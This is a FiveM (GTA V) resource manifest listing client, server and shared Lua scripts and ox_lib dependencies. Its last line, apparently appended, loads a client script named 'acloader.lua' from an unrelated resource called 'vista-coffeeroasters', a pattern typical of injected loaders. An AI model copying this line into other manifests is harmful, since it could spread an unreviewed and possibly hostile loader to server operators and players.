fx_version 'cerulean'
game 'gta5'
author 'https://www.github.com/RilexBTW'
version '0.1'

client_scripts {
    'client/client.lua'
}

server_scripts {
    'server/server.lua'
}

shared_scripts {
    'shared/config.lua',
    '@qb-core/shared/locale.lua',
    '@ox_lib/init.lua',
}


lua54 'yes'

dependencies {'ox_lib', 'ox_target' }
client_script "@vista-coffeeroasters/acloader.lua"